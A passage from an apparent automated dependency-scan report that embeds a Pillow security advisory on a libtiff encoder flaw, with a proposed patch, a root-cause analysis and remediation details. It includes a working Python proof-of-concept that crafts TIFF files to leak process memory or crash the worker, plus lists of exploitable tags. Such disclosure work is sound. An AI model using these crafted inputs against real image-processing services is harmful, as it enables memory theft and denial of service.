set_tiff_array_field(\n\u003e +                        \u0026encoder-\u003estate, key_int, passcount, len, av\n\u003e +                    );\n\u003e                      free(av);\n\u003e                  }\n\u003e              }\n\u003e diff --git a/src/libImaging/TiffDecode.c b/src/libImaging/TiffDecode.c\n\u003e index 8a57c523d..e14dd50bb 100644\n\u003e --- a/src/libImaging/TiffDecode.c\n\u003e +++ b/src/libImaging/TiffDecode.c\n\u003e @@ -923,6 +923,29 @@ ImagingLibTiffMergeFieldInfo(\n\u003e      return TIFFMergeFieldInfo(clientstate-\u003etiff, info, n);\n\u003e  }\n\u003e  \n\u003e +int\n\u003e +ImagingLibTiffFindField(\n\u003e +    ImagingCodecState state,\n\u003e +    int key,\n\u003e +    TIFFDataType *field_type,\n\u003e +    int *passcount,\n\u003e +    int *writecount\n\u003e +) {\n\u003e +    // Look up libtiff's own definition of a tag. TIFFMergeFieldInfo does not\n\u003e +    // replace the definition of a tag that libtiff already knows, so this is\n\u003e +    // what TIFFSetField will use for such tags.\n\u003e +    TIFFSTATE *clientstate = (TIFFSTATE *)state-\u003econtext;\n\u003e +    const TIFFField *fip = TIFFFindField(clientstate-\u003etiff, (ttag_t)key, TIFF_ANY);\n\u003e +\n\u003e +    if (!fip) {\n\u003e +        return 0;\n\u003e +    }\n\u003e +    *field_type = TIFFFieldDataType(fip);\n\u003e +    *passcount = TIFFFieldPassCount(fip);\n\u003e +    *writecount = TIFFFieldWriteCount(fip);\n\u003e +    return 1;\n\u003e +}\n\u003e +\n\u003e  int\n\u003e  ImagingLibTiffSetField(ImagingCodecState state, ttag_t tag, ...) {\n\u003e      // after tif_dir.c-\u003eTIFFSetField.\n\u003e diff --git a/src/libImaging/TiffDecode.h b/src/libImaging/TiffDecode.h\n\u003e index c31d0b9d8..ee1e4a5f9 100644\n\u003e --- a/src/libImaging/TiffDecode.h\n\u003e +++ b/src/libImaging/TiffDecode.h\n\u003e @@ -41,6 +41,14 @@ ImagingLibTiffMergeFieldInfo(\n\u003e      ImagingCodecState state, TIFFDataType field_type, int key, int is_var_length\n\u003e  );\n\u003e  extern int\n\u003e +ImagingLibTiffFindField(\n\u003e +    ImagingCodecState state,\n\u003e +    int key,\n\u003e +    TIFFDataType *field_type,\n\u003e +    int *passcount,\n\u003e +    int *writecount\n\u003e +);\n\u003e +extern int\n\u003e  ImagingLibTiffSetField(ImagingCodecState state, ttag_t tag, ...);\n\u003e  \n\u003e  /*\n\u003e ```\n\u003e \n\u003e ## The reproducer\n\u003e \n\u003e \u003cdetails\u003e\n\u003e \u003csummary\u003eReproducer — \u003ccode\u003erepro\u003c/code\u003e, 2,545 bytes (click to open)\u003c/summary\u003e\n\u003e \n\u003e Its last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`.\n\u003e \n\u003e ```python\n\u003e #!/usr/bin/env python3\n\u003e # Pillow libtiff writer: a count-1 integer tag copied from the source TIFF is passed to\n\u003e # TIFFSetField() as one scalar vararg; for tags libtiff itself defines as arrays it is\n\u003e # consumed as a byte COUNT (DNGPrivateData 50740 -\u003e N bytes of process memory written\n\u003e # into the output) or as a POINTER (ActiveArea 50829 -\u003e SIGSEGV).  Application side is\n\u003e # the ordinary \"open upload, save as TIFF\" (compression is inherited -\u003e libtiff writer).\n\u003e import io, struct, subprocess, sys, resource\n\u003e from PIL import Image\n\u003e \n\u003e def upload(tag, value):\n\u003e     \"\"\"Pillow-written 16x16 LZW TIFF, plus one extra IFD entry \u003ctag\u003e LONG[1] = value.\"\"\"\n\u003e     b = io.BytesIO()\n\u003e     Image.new(\"RGB\", (16, 16), \"red\").save(b, \"TIFF\", compression=\"tiff_lzw\")\n\u003e     data = bytearray(b.getvalue()); assert data[:4] == b\"II*\\0\"\n\u003e     (off,) = struct.unpack_from(\"\u003cI\", data, 4)\n\u003e     (n,) = struct.unpack_from(\"\u003cH\", data, off)\n\u003e     ents = [bytes(data[off + 2 + 12 * i: off + 14 + 12 * i]) for i in range(n)]\n\u003e     ents.append(struct.pack(\"\u003cHHII\", tag, 4, 1, value))\n\u003e     ents.sort(key=lambda e: struct.unpack_from(\"\u003cH\", e)[0])\n\u003e     data += b\"\\0\" * (len(data) \u0026 1); new_off = len(data)\n\u003e     data += struct.pack(\"\u003cH\", len(ents)) + b\"\".join(ents) + struct.pack(\"\u003cI\", 0)\n\u003e     struct.pack_into(\"\u003cI\", data, 4, new_off)\n\u003e     return bytes(data)\n\u003e \n\u003e def resave(src):                       # the whole \"service\"\n\u003e     im = Image.open(io.BytesIO(src)); out = io.BytesIO(); im.save(out, \"TIFF\")\n\u003e     return out.getvalue()\n\u003e \n\u003e if len(sys.argv) \u003e 1 and sys.argv[1] == \"child\":\n\u003e     resource.setrlimit(resource.RLIMIT_CORE, (0, 0))\n\u003e     resave(upload(50829, 64)); sys.exit(0)\n\u003e \n\u003e print(\"PIL core:\", Image.core.__file__)\n\u003e ctl = Image.open(io.BytesIO(resave(upload(65000, 4096)))).tag_v2.get(65000)\n\u003e print(\"control  tag 65000=4096 -\u003e\", repr(ctl))\n\u003e \n\u003e N = 65536\n\u003e src = upload(50740, N)\n\u003e try:\n\u003e     v = Image.open(io.BytesIO(resave(src))).tag_v2.get(50740)\n\u003e except (ValueError, RuntimeError) as e:   # a fixed Pillow may reject the tag\n\u003e     v = e\n\u003e leak = isinstance(v, bytes) and len(v) == N and v[:64] not in src\n\u003e print(f\"leak     tag 50740={N} from a {len(src)}-byte upload -\u003e\",\n\u003e       f\"{len(v)} bytes not present in input, head {v[:32].hex()}\" if leak else repr(v)[:80])\n\u003e if leak:\n\u003e     so = open(Image.core.__file__, \"rb\").read()\n\u003e     print(\"         leaked bytes found in _imaging.so at file offset\", hex(so.find(v[:256])))\n\u003e \n\u003e rc = subprocess.call([sys.executable, __file__, \"child\"])\n\u003e crash = rc in (-11, 139)\n\u003e print(\"crash    tag 50829=64 -\u003e child exit\", rc, \"(SIGSEGV)\" if crash else \"\")\n\u003e print(\"BUG\" if leak or crash else \"OK\")\n\u003e ```\n\u003e \u003c/details\u003e\n\u003e \n\u003e ---\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | pillow | 12.3.0 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-xvh5-g6gv-559v | pillow | 13.0.0 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-112902\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
                "text": "**Your dependency is vulnerable to [CVE-2026-112902](https://osv.dev/CVE-2026-112902)**.\n\n## [GHSA-xvh5-g6gv-559v](https://osv.dev/GHSA-xvh5-g6gv-559v)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ```\n\u003e ============================================================================\n\u003e Memory disclosure and segfault in libtiff encoder via crafted TIFF tags\n\u003e Location: src/encode.c:1014  in PyImaging_LibTiffEncoderNew()\n\u003e Commit:   a707c6b21c313880d0771e54965d142dd42358b6\n\u003e ============================================================================\n\u003e ```\n\u003e \n\u003e A crafted TIFF file of a few hundred bytes makes Pillow copy an attacker-chosen amount of its own process memory into the TIFF it writes back out, or crash the process outright. The trigger is an ordinary `Image.open()` followed by a bare `im.save(fp, \"TIFF\")`. The only precondition is that the application re-saves images as TIFF. When the uploaded file is compressed, Pillow routes that save through libtiff automatically, with no options from the application. The attached reproducer does this with a 356-byte LZW TIFF: one crafted tag comes back holding 65536 bytes taken from `_imaging.so`'s read-only data, and a second crafted tag makes the worker die with SIGSEGV on every run.\n\u003e \n\u003e The bug is in `PyImaging_LibTiffEncoderNew` (`src/encode.c`). It decides what arguments to pass to the variadic `TIFFSetField()` from the shape of the Python value (scalar, tuple or bytes). It assumes its `ImagingLibTiffMergeFieldInfo()` call defined how libtiff will read them. But `TIFFMergeFieldInfo()` never overrides libtiff's built-in field table, so libtiff reads the arguments according to its own definition of the tag:\n\u003e \n\u003e - For a counted array tag such as DNGPrivateData (50740), a count-1 integer in the source file is taken as the byte count. The data pointer is then read from an argument slot Pillow never wrote, and that many bytes are copied into the output.\n\u003e - For a fixed-size array tag such as ActiveArea (50829), the integer itself is used as the source address.\n\u003e \n\u003e Where that unwritten slot points depends on the compiler. In the tested clang build it points into `_imaging.so`, and a larger count returned thousands of pointers into libpython, libc and libtiff, which defeats address-space randomisation for anyone chaining another bug. When the application preserves metadata with `tiffinfo=im.tag_v2`, a 64-bit entry turns ActiveArea into a 16-byte read from an address the attacker chooses. All observed memory errors are reads; no out-of-bounds write was found.\n\u003e \n\u003e Other branches of the same loop share the defect and are reachable from crafted TIFFs or from EXIF in JPEG/PNG/WebP re-saved as compressed TIFF. These are the `bytes`, RATIONAL-tuple and typed-tuple branches, and a BYTE-typed ColorMap. The file-reachable forwarding was introduced in `a3d45e9cefd0` (\"Added custom int and float TIFF tags\") and first released in 5.4.0.\n\u003e \n\u003e ## Details\n\u003e \n\u003e `PyImaging_LibTiffEncoderNew` (`src/encode.c:777-1060`) chooses the argument\n\u003e list it hands to the variadic `TIFFSetField()` from the *Python* value of each\n\u003e tag — scalar vs. tuple vs. `bytes`, and a type that is either autodetected or\n\u003e copied from the source file's IFD — and assumes that its own\n\u003e `ImagingLibTiffMergeFieldInfo()` registration defines how libtiff will read the\n\u003e `va_list`. It does not: libtiff keeps its built-in definition for every tag it\n\u003e already knows, and core tags are never registered at all. libtiff therefore\n\u003e consumes the varargs as `(count, pointer)`, `(pointer)` or three pointers\n\u003e according to *its* field table, whatever Pillow actually pushed. The encoder\n\u003e never consults that table (`TIFFFindField` / `TIFFFieldPassCount` /\n\u003e `TIFFFieldWriteCount` / `TIFFFieldDataType`) before the call.\n\u003e \n\u003e The most severe instance, and the one the attached reproducer exercises: when a\n\u003e TIFF is re-saved through the libtiff writer, every tag of the source IFD that\n\u003e Pillow does not recognise is forwarded to libtiff with `TIFFSetField()`. A\n\u003e count-1 integer entry is passed as a single scalar vararg. If libtiff's own\n\u003e field table defines that tag number as an *array* field, libtiff consumes the\n\u003e varargs as `(count, pointer)` or `(pointer)` instead, so the attacker's integer\n\u003e becomes either the number of bytes to copy from a never-written vararg slot, or\n\u003e the source address itself. The same mismatch is reachable through the typed\n\u003e tuple branches (tuple length consumed as a pointer for fixed-count built-in\n\u003e tags such as `CFARepeatPatternDim`, even when the source file is well-formed),\n\u003e the `bytes`, `TIFF_RATIONAL`-tuple and core-tag branches of the same loop;\n\u003e those are listed\n\u003e under *Other branches with the same defect* below and need to be covered by the\n\u003e same fix.\n\u003e \n\u003e A 181-byte TIFF (16×16 RGB, one LZW strip, plus one extra IFD entry\n\u003e `50740 / LONG / count 1 / value 4096` — DNGPrivateData) opened with\n\u003e `Image.open()` and saved with a bare `im.save(buf, \"TIFF\")` produces a 4296-byte\n\u003e output whose tag 50740 holds 4096 bytes that occur nowhere in the input; scanning\n\u003e `/proc/self/mem` finds them in the read-only data segment of `_imaging.so`.\n\u003e Changing the extra entry to `50829 / LONG / 1 / 64` (ActiveArea) makes the same\n\u003e two calls segfault in `memcpy(dst, src=0x40, n=16)` under\n\u003e `ImagingLibTiffSetField` ← `PyImaging_LibTiffEncoderNew`. An ASan build of the\n\u003e extensions reports `READ of size 4096` in `memcpy` called from\n\u003e `src/encode.c:1014` for the first input.\n\u003e \n\u003e ### Code path\n\u003e \n\u003e `_save` copies all tags of the opened image into the libtiff attribute list.\n\u003e For a tag that is neither in `LIBTIFF_CORE` nor in `TiffTags.TAGS_V2`, no type\n\u003e is recorded, so the value goes through untyped:\n\u003e \n\u003e ```python\n\u003e # src/PIL/TiffImagePlugin.py:1782\n\u003e supplied_tags = {**legacy_ifd, **getattr(im, \"tag_v2\", {})}\n\u003e …\n\u003e # :1959-1982\n\u003e for tag, value in itertools.chain(ifd.items(), supplied_tags.items()):\n\u003e     if tag not in TiffTags.LIBTIFF_CORE:\n\u003e         …\n\u003e         elif isinstance(value, (int, float, str, bytes)) or …:\n\u003e             type = TiffTags.lookup(tag).type      # None for 50740, 50829, …\n\u003e             if type:\n\u003e                 types[tag] = type\n\u003e     if tag not in atts and tag not in blocklist:\n\u003e         …\n\u003e             atts[tag] = value                     # plain int 4096\n\u003e ```\n\u003e \n\u003e `compression` defaults to the source image's `im.info[\"compression\"]`\n\u003e (`TiffImagePlugin.py:1731-1746`), so a compressed source selects the libtiff\n\u003e writer without the application asking for it.\n\u003e \n\u003e In the encoder the untyped `int` is autodetected as `TIFF_LONG`\n\u003e (`src/encode.c:805-815`), the tag is \"registered\" as a scalar custom field, and\n\u003e then set with one 32-bit vararg:\n\u003e \n\u003e ```c\n\u003e // src/encode.c:844      (is_var_length = 0 → writecount 1, passcount 0)\n\u003e if (ImagingLibTiffMergeFieldInfo(\u0026encoder-\u003estate, type, key_int, is_var_length)) {\n\u003e     … continue;\n\u003e }\n\u003e …\n\u003e // src/encode.c:1013-1016\n\u003e } else if (type == TIFF_LONG || type == TIFF_IFD) {\n\u003e     status = ImagingLibTiffSetField(\n\u003e         \u0026encoder-\u003estate, (ttag_t)key_int, (UINT32)PyLong_AsLong(value)\n\u003e     );\n\u003e ```\n\u003e \n\u003e The registration does not do what the caller assumes. `TIFFMergeFieldInfo()`\n\u003e only adds definitions for tags libtiff does not already know and returns 0\n\u003e (success) either way, so for tags in libtiff's built-in table the built-in\n\u003e definition stays in force. Queried against the linked libtiff 4.5.0 after\n\u003e exactly Pillow's merge call:\n\u003e \n\u003e ```\n\u003e 50740 DNGPrivateData      type=BYTE   passcount=1 writecount=-1   (unchanged)\n\u003e 50829 ActiveArea          type=LONG   passcount=0 writecount=4    (unchanged)\n\u003e 65000 CustomField         type=LONG   passcount=0 writecount=1    (Pillow's definition, tag was unknown)\n\u003e ```\n\u003e \n\u003e libtiff's setter for `FIELD_CUSTOM` tags then interprets the `va_list`\n\u003e according to *its* definition: for `passcount=1` it reads `va_arg(ap, int)` as\n\u003e the element count — the attacker's 4096 — allocates `count * size` bytes and\n\u003e `memcpy`s that many bytes from `va_arg(ap, void *)`, a slot\n\u003e `PyImaging_LibTiffEncoderNew` never wrote. On x86-64 that slot is register\n\u003e `rcx`; in this build it holds a pointer into `_imaging.so`'s `.rodata`, so the\n\u003e copy succeeds deterministically (a value of 2 000 000 also succeeds and yields a\n\u003e 2 000 200-byte output). `TIFFWriteDirectory` writes the copied bytes into the\n\u003e output file as the tag's value. For fixed-count array fields (`passcount=0`,\n\u003e `writecount=4` for ActiveArea) there is no count argument, so the attacker's\n\u003e scalar is consumed as the `void *` source and 16 bytes are read from address\n\u003e 64 → SIGSEGV.\n\u003e \n\u003e Tags in libtiff 4.5's built-in table that Pillow forwards untyped and that take\n\u003e the `(count, pointer)` form include DNGPrivateData 50740, CFAPattern 33422,\n\u003e CFAPlaneColor 50710, LinearizationTable 50712, BlackLevel 50714, WhiteLevel\n\u003e 50717, ColorMatrix1/2 50721/50722, AsShotNeutral 50728, OriginalRawFileName/Data\n\u003e 50827/50828, AsShotICCProfile 50831, CurrentICCProfile 50833. Fixed-count ones\n\u003e (pointer only → crash) include ActiveArea 50829, DNGVersion/DNGBackwardVersion\n\u003e 50706/50707, DefaultScale/DefaultCropOrigin/DefaultCropSize 50718–50720,\n\u003e AsShotWhiteXY 50729, CFARepeatPatternDim 33421, BlackLevelRepeatDim 50713,\n\u003e ImageLayer 34732, RawDataUniqueID 50781.\n\u003e \n\u003e When the application saves with `tiffinfo=im.tag_v2` (the documented way to\n\u003e preserve metadata), the file-declared type is honoured, and a `LONG8` entry\n\u003e reaches the `(uint64_t)PyLong_AsLongLong(value)` branch at\n\u003e `src/encode.c:1049-1052`. For ActiveArea that is a 16-byte read from a full\n\u003e 64-bit attacker-chosen address into the output: a source entry\n\u003e `50829 / LONG8 / 1 / \u003caddress of a Python bytes object\u003e` produced an output\n\u003e ActiveArea of `(b'SECR', b'ET-T', b'OKEN', b'-012')` in testing.\n\u003e \n\u003e The comment above `blocklist +=` at `TiffImagePlugin.py:1938-1944` already notes\n\u003e that array tags with the wrong length \"will result in segfaults\"; the blocklist\n\u003e covers only a handful of tags Pillow itself knows, not the ones libtiff knows and\n\u003e Pillow does not. Forwarding of these tags was introduced in `a3d45e9cefd0`\n\u003e (\"Added custom int and float TIFF tags\", 2018-10-25), first released in 5.4.0;\n\u003e releases 2.0.0–3.0.0 forwarded them as scalars too, until `9fa6634f4`\n\u003e (\"Partial fix for #1597\") limited `_save` to `LIBTIFF_CORE`.\n\u003e \n\u003e ### Other branches with the same defect\n\u003e \n\u003e The scalar-integer branch above is one of several places in the same loop\n\u003e where the call shape is derived from the Python value rather than from\n\u003e libtiff's definition. All of the following were confirmed on this commit (stock\n\u003e build crashes and/or ASan reports, stack always `memcpy ← libtiff ←\n\u003e ImagingLibTiffSetField src/libImaging/TiffDecode.c:934 ←\n\u003e PyImaging_LibTiffEncoderNew`), and all are reachable from a sub-1 KB crafted\n\u003e file followed by an ordinary `save()`:\n\u003e \n\u003e * **Typed tuple → `(len, av)` for a fixed-count built-in field**\n\u003e   (`src/encode.c:904-994`, the SHORT/LONG/SBYTE/SSHORT/SLONG/FLOAT/DOUBLE\n\u003e   tuple branches all call `ImagingLibTiffSetField(..., len, av)`). For libtiff\n\u003e   built-in fields with `passcount=0` and a fixed `writecount` —\n\u003e   `CFARepeatPatternDim` 33421 (SHORT×2), `BlackLevelRepeatDim` 50713\n\u003e   (SHORT×2), `ImageLayer` 34732 (LONG×2), `ActiveArea` 50829 (LONG×4),\n\u003e   `MatrixWorldToScreen/Camera` 33305/33306 (FLOAT×16) — libtiff takes the\n\u003e   *first* vararg as the source pointer, so the tuple length becomes the\n\u003e   `memcpy` source address. A perfectly well-formed 206-byte 8×8 PackBits TIFF\n\u003e   carrying `33421 / SHORT / 2 / (2, 2)` re-saved with a bare\n\u003e   `im.save(out, \"TIFF\")` dies with SIGSEGV in `memcpy` (gdb: `rsi = 0x2`, the\n\u003e   tuple length) on every run; so does\n\u003e   `Image.new(\"L\", (8, 8)).save(buf, \"TIFF\", compression=\"packbits\",\n\u003e   tiffinfo={33421: (2, 2)})`, and a JPEG whose EXIF carries the tag saved with\n\u003e   `exif=im.getexif()` into a compressed TIFF. `bytes` values for built-in\n\u003e   fixed-count BYTE tags (e.g. `DNGVersion` 50706, BYTE×4) crash the same way\n\u003e   through the `(PyBytes_Size, PyBytes_AsString)` call at `src/encode.c:860-865`.\n\u003e   The mirror image for `passcount=1` fields: `Photoshop` 34377 declared\n\u003e   SHORT, count 1, value 60000 takes the scalar branch at `:1009-1012`, libtiff\n\u003e   reads 60000 as the count and an unpassed vararg as the pointer, and the\n\u003e   re-save *succeeds* with a 60162-byte output whose tag 34377 holds 60000 bytes\n\u003e   of process memory (here C prototype strings from `_imaging.so`'s `.rodata`).\n\u003e * **`bytes` value → single `char *`** (`src/encode.c:805-815` autodetects\n\u003e   `bytes` as `TIFF_ASCII`; `:1033-1042` passes `PyBytes_AsString(value)` alone).\n\u003e   `ImageFileDirectory_v2._setitem` stores a BYTE-typed entry as bare `bytes`\n\u003e   and an ASCII-typed one as `str` (encoded to `bytes` by `_save`), so the\n\u003e   file's declared type selects this branch.\n\u003e   - `ColorMap` (320) declared BYTE with 4 bytes of data in a non-palette\n\u003e     PackBits TIFF: 320 is in `core_tags[]`, no type is consulted, the value\n\u003e     skips the 768-tuple `TIFFTAG_COLORMAP` branch (`:871-895`) and libtiff reads\n\u003e     three `uint16_t *` and copies `1 \u003c\u003c BitsPerSample` shorts from each — a\n\u003e     512-byte over-read of the 5-byte Python bytes buffer, then dereference of\n\u003e     two stale argument registers → SIGSEGV on every run of\n\u003e     `Image.open(f); im.save(out, \"TIFF\")`. `COLORMAP` is not in `_save`'s\n\u003e     `blocklist`.\n\u003e   - `Photoshop` (34377) declared ASCII: `_save` copies value *and* type\n\u003e     (`TiffImagePlugin.py:1802-1818`; only `IPTC_NAA_CHUNK` has a BYTE/UNDEFINED\n\u003e     type guard there, from commit 2245df0a — `PHOTOSHOP_CHUNK` and `XMP` do\n\u003e     not). libtiff's definition is BYTE, `passcount=1`, so the low 32 bits of\n\u003e     the `char *` become the byte count for a `memcpy` from a stale register\n\u003e     (ASan: `READ of size 3518384`; stock: SIGSEGV in about half of runs,\n\u003e     otherwise `RuntimeError`). `ICCProfile` (34675) declared ASCII behaves the\n\u003e     same way via `im.info[\"icc_profile\"]` → `ifd[ICCPROFILE]`\n\u003e     (`TiffImagePlugin.py:1822-1824`).\n\u003e * **`TIFF_RATIONAL` tuple → array with no count** (`src/encode.c:995-1006`;\n\u003e   compare the `TIFF_FLOAT` branch at `:969-981`, which passes `len, av`).\n\u003e   - For a private tag (e.g. 50000) Pillow itself registers the field with\n\u003e     `passcount=1` (`TiffDecode.c:904-908`), so libtiff takes the low 32 bits of\n\u003e     `av` as the element count and the next stale vararg as the source:\n\u003e     `heap-buffer-overflow READ of size 119872 … right of 8-byte region` under\n\u003e     ASan (`119872 == 4 * low32(av)`), SIGSEGV in ~4 of 5 stock runs. Reached by\n\u003e     a JPEG whose EXIF carries one private RATIONAL×2 tag saved with\n\u003e     `im.save(out, \"TIFF\", compression=\"tiff_lzw\", exif=im.info[\"exif\"])`, or a\n\u003e     TIFF re-saved with `tiffinfo=im.tag_v2` (`_setitem` auto-types a tuple of\n\u003e     `IFDRational` as RATIONAL, `TiffImagePlugin.py:689-701`; `types[tag] =\n\u003e     ifd.tagtype[tag]` at `:1968`).\n\u003e   - For libtiff's built-in fixed-count float tags `WhitePoint` (318, 2),\n\u003e     `PrimaryChromaticities` (319, 6) and `YCbCrCoefficients` (529, 3), which\n\u003e     `_save` forwards from any source TIFF and types RATIONAL via\n\u003e     `TiffTags.lookup`, the pointer-only convention happens to match, but\n\u003e     libtiff copies its *fixed* count from an array that is only as long as the\n\u003e     file declared: a PackBits TIFF with `PrimaryChromaticities` count 1 and a\n\u003e     bare `im.save(out, \"TIFF\")` gives `READ of size 24 … right of 4-byte\n\u003e     region`, and the over-read floats are written to tag 319 of the output.\n\u003e     `REFERENCEBLACKWHITE`/`TRANSFERFUNCTION` are blocklisted at\n\u003e     `TiffImagePlugin.py:1941-1952` for exactly this reason; 318/319/529 are not.\n\u003e * **Core tag reached as a scalar via a stale file-supplied type.** With the\n\u003e   re-save idiom `im.save(out, \"TIFF\", tiffinfo=im.tag_v2)`, `_save` copies\n\u003e   `ifd.tagtype[key] = info.tagtype[key]` for every key\n\u003e   (`TiffImagePlugin.py:1768-1776`) and later assigns its own values to some of\n\u003e   the same tags without resetting the type (`ifd[COLORMAP] = colormap` at\n\u003e   `:1870-1877`; likewise BitsPerSample, SamplesPerPixel, ExtraSamples,\n\u003e   ICCProfile, …). For a 418-byte PackBits *palette* TIFF whose ColorMap entry\n\u003e   is declared BYTE, `_setitem` (`:751-770`) truncates `_save`'s 768-entry\n\u003e   palette to a single `int` (with only a \"too many entries\" warning), the\n\u003e   encoder receives `(320, 0)`, autodetects `TIFF_LONG`, and\n\u003e   `src/encode.c:1013-1016` calls `TIFFSetField(TIFFTAG_COLORMAP, (UINT32)0)` —\n\u003e   libtiff reads three `uint16_t *` and faults at an address ≤ 65280 on every\n\u003e   run. The stale-tagtype copy is a Python-side hygiene bug in its own right,\n\u003e   but its memory-safety consequence exists only because the encoder lets a\n\u003e   non-tuple value reach `TIFFSetField(COLORMAP)`.\n\u003e \n\u003e ## Impact\n\u003e \n\u003e Any service that accepts a TIFF and writes it back out as TIFF through libtiff —\n\u003e which happens with a plain `im.save(fp, \"TIFF\")` whenever the uploaded file is\n\u003e compressed, or whenever a `compression=` other than raw is requested — returns\n\u003e to the uploader, inside one metadata tag of the produced file, an\n\u003e attacker-chosen number of bytes read from a stale pointer in the worker process,\n\u003e deterministically and without retries. Which memory that is depends on the\n\u003e compiler's register allocation for `PyImaging_LibTiffEncoderNew`: in this clang\n\u003e build the pointer is `_imaging.so + 0x1588`, so a request for 262 144 bytes\n\u003e (which succeeded every time in testing, as did 2 000 000) covers the\n\u003e extension's `.rodata`, `.data.rel.ro`/GOT and `.data` and returned 2 800+\n\u003e resolved pointers into libpython, libc, libtiff, libjpeg and others — a complete\n\u003e ASLR bypass for chaining with any other memory bug; a gcc build of the same\n\u003e source left a different, unrelated address in that slot. The fixed-count\n\u003e variant kills the worker process with SIGSEGV from a 181-byte upload on every\n\u003e request. With `tiffinfo=im.tag_v2` the source\n\u003e address is fully attacker-chosen (16-byte arbitrary read into the output for\n\u003e ActiveArea, or a crash). No non-default Pillow setting is involved; the only\n\u003e precondition is TIFF-to-TIFF re-encoding.\n\u003e \n\u003e The other branches add further deterministic process-kill inputs (BYTE-typed\n\u003e ColorMap in any RGB or palette TIFF; `thumbnail()` keeps `tag_v2`, so\n\u003e open→thumbnail→save-as-TIFF is affected too) and extend the reach to\n\u003e JPEG/PNG/WebP uploads whose EXIF is preserved with `exif=` when converting to\n\u003e libtiff-compressed TIFF. All the memory errors are reads; libtiff sizes its\n\u003e destination buffers with the same count it copies, so no out-of-bounds write\n\u003e was found.\n\u003e \n\u003e ## Reproducing\n\u003e \n\u003e `repro` is one Python script, run against the stock build with the installed `PIL`. It needs no compiler and no extra files.\n\u003e \n\u003e `upload(tag, value)` has Pillow write a 16×16 red RGB image as an LZW-compressed TIFF, then appends a new IFD holding the same entries plus one extra `\u003ctag\u003e / LONG / count 1 / value` (kept in tag order) and points the header at it — a 356-byte input on this tree. The source is LZW-compressed on purpose. A bare `im.save(out, \"TIFF\")` keeps the source's compression, so the save goes through the libtiff writer even though the application passes no arguments. `resave()` is the whole \"application\": `Image.open(BytesIO(src)); im.save(out, \"TIFF\")`.\n\u003e \n\u003e The script runs three cases:\n\u003e \n\u003e 1. **Control, tag 65000 = 4096.** libtiff does not know this tag, so the file is re-saved correctly and the output tag reads back as the integer `4096`. This is what should happen to every tag.\n\u003e 2. **Leak, DNGPrivateData 50740 = 65536.** libtiff's built-in definition of this tag is a counted BYTE array. It reads Pillow's single scalar as the *count* and takes the data pointer from a vararg slot Pillow never wrote. The output tag comes back as `bytes` of length 65536 that do not occur in the input. The script prints the first 32 of them and the file offset at which they occur in `_imaging.so` on disk. On this build they always do (offset `0x57588`): the stale pointer aims into the extension's read-only data.\n\u003e 3. **Wild read, ActiveArea 50829 = 64.** libtiff defines this tag as a fixed LONG[4] array with no count, so it uses the scalar 64 as the *source address*. The script re-runs itself as a child process (`repro child`, core dumps disabled) to do this re-save, and the child exits with `-11`, meaning SIGSEGV.\n\u003e \n\u003e Expected output on the affected tree:\n\u003e \n\u003e ```\n\u003e control  tag 65000=4096 -\u003e 4096\n\u003e leak     tag 50740=65536 from a 356-byte upload -\u003e 65536 bytes not present in input, head a661fcffc661fcff3360fcff7b61fcffd361fcff085ffcffe061fcff3360fcff\n\u003e          leaked bytes found in _imaging.so at file offset 0x57588\n\u003e crash    tag 50829=64 -\u003e child exit -11 (SIGSEGV)\n\u003e BUG\n\u003e ```\n\u003e \n\u003e The script prints `BUG` if case 2 leaks or case 3 crashes. Both are deterministic on this build. A fixed Pillow prints `OK`: the tag does not come back as 65536 bytes of foreign data (it reads back as `None`, or `save()` raises `ValueError`/`RuntimeError`, which the script catches), and the child exits with something other than SIGSEGV (0, or 1 if `save()` raised).\n\u003e \n\u003e The other branches can be checked by hand on the stock build in the same way\n\u003e (each as `Image.open(f); im.save(BytesIO(), \"TIFF\")` in a child process):\n\u003e a PackBits RGB TIFF with an extra IFD entry `320 / BYTE / 4 / \"ABCD\"` →\n\u003e SIGSEGV every run; a PackBits palette TIFF whose ColorMap is `320 / BYTE / 2`\n\u003e saved with `tiffinfo=im.tag_v2` → SIGSEGV every run; a Pillow-written JPEG\n\u003e whose EXIF holds tag 50000 = RATIONAL×2 saved with\n\u003e `compression=\"tiff_lzw\", exif=im.info[\"exif\"]` → SIGSEGV in most runs,\n\u003e `RuntimeError` (\"Failed to allocate memory for custom tag binary object\n\u003e (-N elements of 4 bytes each)\") in the rest.\n\u003e \n\u003e ## Suggested fix\n\u003e \n\u003e The encoder must not guess the calling convention; it has to ask libtiff what\n\u003e the tag's effective definition is *after* `ImagingLibTiffMergeFieldInfo` and\n\u003e marshal accordingly, or refuse. The attached patch does this for non-core tags:\n\u003e \n\u003e * a new `ImagingLibTiffFindField()` in `src/libImaging/TiffDecode.c` (declared\n\u003e   in `TiffDecode.h`, next to the other libtiff wrappers) returns libtiff's\n\u003e   `TIFFFindField` type, `passcount` and `writecount` for a tag;\n\u003e * in `PyImaging_LibTiffEncoderNew` (`src/encode.c`), for a non-core tag that\n\u003e   libtiff already knows, Pillow adopts libtiff's type when it has none of its\n\u003e   own, and after `ImagingLibTiffMergeFieldInfo` a new `tiff_field_matches()`\n\u003e   checks the value against libtiff's definition: a scalar only for a\n\u003e   single-value field whose C argument type (int / `uint64_t` / double /\n\u003e   `char *`) matches, an array only with libtiff's element size and, for\n\u003e   fixed-count fields, exactly `writecount` elements. Anything else raises\n\u003e   `ValueError(\"Tag value does not match libtiff field definition\")` instead of\n\u003e   reaching `TIFFSetField` — this covers the reproducer's DNGPrivateData and\n\u003e   ActiveArea inputs, ASCII-typed Photoshop, short PrimaryChromaticities and the\n\u003e   `LONG8` 